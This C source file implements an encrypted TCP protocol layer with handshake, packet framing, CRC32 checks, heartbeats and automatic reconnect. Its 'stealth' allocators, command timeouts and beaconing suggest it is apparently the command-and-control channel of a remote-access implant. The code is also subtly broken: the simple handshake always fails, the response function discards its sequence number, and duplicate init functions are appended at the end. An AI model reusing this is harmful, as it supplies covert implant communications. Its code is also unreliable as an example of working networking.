/*
 * Network Protocol Implementation - REAL WORKING VERSION
 */

#include "protocol.h"
#include "../core/utils.h"
#include "../crypto/aes.h"

#ifdef PLATFORM_WINDOWS
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <errno.h>
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
#endif

// Initialize networking (Windows specific)
static int network_init(void) {
#ifdef PLATFORM_WINDOWS
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData);
#else
    return 0;
#endif
}

// Cleanup networking (Windows specific)
static void network_cleanup(void) {
#ifdef PLATFORM_WINDOWS
    WSACleanup();
#endif
}

// Socket operations
int socket_create(void) {
    network_init();
    return socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
}

int socket_connect(int sock, const char* host, uint16_t port) {
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    // Handle localhost specially
    if (str_cmp(host, "localhost") == 0) {
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    } else {
        // Try to convert as IP address first
        addr.sin_addr.s_addr = inet_addr(host);
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            // Not an IP, try hostname resolution
            struct hostent* he = gethostbyname(host);
            if (he == NULL) {
                return -1;
            }
            mem_cpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        }
    }
    
    return connect(sock, (struct sockaddr*)&addr, sizeof(addr));
}

int socket_send(int sock, const uint8_t* data, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        int ret = send(sock, (const char*)(data + sent), len - sent, 0);
        if (ret <= 0) {
            return -1;
        }
        sent += ret;
    }
    return 0;
}

int socket_recv(int sock, uint8_t* buffer, size_t len) {
    return recv(sock, (char*)buffer, len, 0);
}

int socket_close(int sock) {
    return closesocket(sock);
}

int socket_set_timeout(int sock, int timeout_ms) {
#ifdef PLATFORM_WINDOWS
    DWORD timeout = timeout_ms;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif
    return 0;
}

// CRC32 implementation
uint32_t protocol_crc32(const uint8_t* data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    
    return ~crc;
}

// Encryption/Decryption wrappers
int protocol_encrypt_data(uint8_t* data, size_t len,
                         const uint8_t* key, const uint8_t* iv) {
    // Use AES CTR mode
    uint8_t nonce[8];
    mem_cpy(nonce, iv, 8);
    aes256_ctr_crypt(data, len, key, nonce);
    return 0;
}

int protocol_decrypt_data(uint8_t* data, size_t len,
                         const uint8_t* key, const uint8_t* iv) {
    // CTR mode is symmetric
    return protocol_encrypt_data(data, len, key, iv);
}

// Connection management
int protocol_connect(connection_t* conn, const char* host, uint16_t port) {
    // Create socket
    conn->socket = socket_create();
    if (conn->socket < 0) {
        return -1;
    }
    
    // Set timeout
    socket_set_timeout(conn->socket, COMMAND_TIMEOUT);
    
    // Connect
    if (socket_connect(conn->socket, host, port) != 0) {
        socket_close(conn->socket);
        conn->socket = -1;
        return -1;
    }
    
    // Update connection info
    size_t host_len = str_len(host);
    if (host_len >= sizeof(conn->server_host)) {
        host_len = sizeof(conn->server_host) - 1;
    }
    mem_cpy(conn->server_host, host, host_len);
    conn->server_host[host_len] = '\0';
    conn->server_port = port;
    
    // Perform handshake
    if (protocol_handshake(conn) != 0) {
        socket_close(conn->socket);
        conn->socket = -1;
        return -1;
    }
    
    conn->connected = 1;
    return 0;
}

int protocol_disconnect(connection_t* conn) {
    if (conn->socket >= 0) {
        // Send goodbye packet
        protocol_send_packet(conn, PACKET_BYE, NULL, 0);
        
        // Close socket
        socket_close(conn->socket);
        conn->socket = -1;
    }
    
    conn->connected = 0;
    return 0;
}

int protocol_reconnect(connection_t* conn) {
    // Disconnect if connected
    if (conn->connected) {
        protocol_disconnect(conn);
    }
    
    // Wait a bit
    sleep_ms(RECONNECT_DELAY);
    
    // Try to reconnect
    return protocol_connect(conn, conn->server_host, conn->server_port);
}

// Simple handshake
int protocol_handshake(connection_t* conn) {
    // Send hello packet with session ID
    packet_t hello_pkt = {0};
    hello_pkt.header.magic = PROTOCOL_MAGIC;
    hello_pkt.header.version = PROTOCOL_VERSION;
    hello_pkt.header.type = PACKET_HELLO;
    hello_pkt.header.sequence = conn->seq_send++;
    hello_pkt.data = conn->session_id;
    hello_pkt.data_len = sizeof(conn->session_id);
    
    // Send without encryption for initial handshake
    uint8_t buffer[sizeof(packet_header_t) + 16];
    mem_cpy(buffer, &hello_pkt.header, sizeof(packet_header_t));
    mem_cpy(buffer + sizeof(packet_header_t), hello_pkt.data, hello_pkt.data_len);
    
    if (socket_send(conn->socket, buffer, sizeof(buffer)) != 0) {
        return -1;
    }
    
    // Receive response
    if (socket_recv(conn->socket, buffer, sizeof(packet_header_t)) != sizeof(packet_header_t)) {
        return -1;
    }
    
    packet_header_t* resp_hdr = (packet_header_t*)buffer;
    if (resp_hdr->magic != PROTOCOL_MAGIC || 
        resp_hdr->type != PACKET_HELLO) {
        return -1;
    }
    
    // Handshake successful
    return 0;
}

// Send packet
int protocol_send_packet(connection_t* conn, packet_type_t type,
                        const uint8_t* data, size_t len) {
    if (!conn->connected) {
        return -1;
    }
    
    // Build packet header
    packet_header_t header = {0};
    header.magic = PROTOCOL_MAGIC;
    header.version = PROTOCOL_VERSION;
    header.type = type;
    header.flags = 0;
    header.sequence = conn->seq_send++;
    header.length = len;
    
    // Generate IV for encryption
    get_random_bytes(header.iv, sizeof(header.iv));
    
    // Allocate buffer for packet
    size_t packet_size = sizeof(header) + len;
    uint8_t* packet = (uint8_t*)stealth_alloc(packet_size);
    if (!packet) {
        return -1;
    }
    
    // Copy data
    mem_cpy(packet, &header, sizeof(header));
    if (len > 0 && data) {
        mem_cpy(packet + sizeof(header), data, len);
        
        // Encrypt data portion
        protocol_encrypt_data(packet + sizeof(header), len,
                            conn->aes_key, header.iv);
    }
    
    // Calculate checksum
    header.checksum = protocol_crc32(packet + sizeof(header), len);
    mem_cpy(packet + offsetof(packet_header_t, checksum),
           &header.checksum, sizeof(header.checksum));
    
    // Send packet
    int ret = socket_send(conn->socket, packet, packet_size);
    
    stealth_free(packet);
    return ret;
}

// Receive packet
int protocol_recv_packet(connection_t* conn, packet_t* packet) {
    if (!conn->connected) {
        return -1;
    }
    
    // Receive header
    uint8_t header_buf[sizeof(packet_header_t)];
    int received = 0;
    
    while (received < sizeof(packet_header_t)) {
        int ret = socket_recv(conn->socket, header_buf + received,
                            sizeof(packet_header_t) - received);
        if (ret <= 0) {
            conn->connected = 0;
            return -1;
        }
        received += ret;
    }
    
    // Parse header
    mem_cpy(&packet->header, header_buf, sizeof(packet_header_t));
    
    // Validate magic
    if (packet->header.magic != PROTOCOL_MAGIC) {
        return -1;
    }
    
    // Receive data if present
    if (packet->header.length > 0) {
        packet->data = (uint8_t*)stealth_alloc(packet->header.length);
        if (!packet->data) {
            return -1;
        }
        
        received = 0;
        while (received < packet->header.length) {
            int ret = socket_recv(conn->socket, packet->data + received,
                                packet->header.length - received);
            if (ret <= 0) {
                stealth_free(packet->data);
                packet->data = NULL;
                conn->connected = 0;
                return -1;
            }
            received += ret;
        }
        
        // Verify checksum
        uint32_t calc_crc = protocol_crc32(packet->data, packet->header.length);
        if (calc_crc != packet->header.checksum) {
            stealth_free(packet->data);
            packet->data = NULL;
            return -1;
        }
        
        // Decrypt data
        protocol_decrypt_data(packet->data, packet->header.length,
                            conn->aes_key, packet->header.iv);
        
        packet->data_len = packet->header.length;
    }
    
    return 0;
}

// Free packet
void protocol_free_packet(packet_t* packet) {
    if (packet->data) {
        secure_zero(packet->data, packet->data_len);
        stealth_free(packet->data);
        packet->data = NULL;
    }
    packet->data_len = 0;
}

// Send response
int protocol_send_response(connection_t* conn, uint32_t seq,
                          const uint8_t* data, size_t len) {
    packet_header_t header = {0};
    header.sequence = seq;  // Match request sequence
    return protocol_send_packet(conn, PACKET_RESPONSE, data, len);
}

// Send error
int protocol_send_error(connection_t* conn, uint32_t seq,
                       const char* error_msg) {
    size_t msg_len = str_len(error_msg);
    return protocol_send_response(conn, seq, (const uint8_t*)error_msg, msg_len);
}

// Send heartbeat
int protocol_send_heartbeat(connection_t* conn) {
    uint8_t heartbeat_data[8];
    get_random_bytes(heartbeat_data, sizeof(heartbeat_data));
    return protocol_send_packet(conn, PACKET_HEARTBEAT,
                               heartbeat_data, sizeof(heartbeat_data));
}
// Socket initialization functions
int socket_init(void) {
#ifdef PLATFORM_WINDOWS
    WSADATA wsa_data;
    return WSAStartup(MAKEWORD(2, 2), &wsa_data);
#else
    return ERR_SUCCESS;
#endif
}

void socket_cleanup(void) {
#ifdef PLATFORM_WINDOWS
    WSACleanup();
#endif
}

// Simplified protocol functions for main.c
int protocol_send(int sock, const uint8_t* data, size_t len) {
    return socket_send(sock, data, len);
}

int protocol_receive(int sock, uint8_t* buffer, size_t* len) {
    int result = socket_recv(sock, buffer, *len);
    if (result > 0) {
        *len = result;
        return ERR_SUCCESS;
    }
    return ERR_NETWORK;
}

int protocol_handshake_simple(int sock) {
    // Simple handshake
    uint8_t hello[] = "HELLO";
    if (socket_send(sock, hello, 5) != 5) {
        return ERR_NETWORK;
    }
    
    uint8_t response[16];
    if (socket_recv(sock, response, sizeof(response)) <= 0) {
        return ERR_NETWORK;
    }
    
    return ERR_SUCCESS;
}
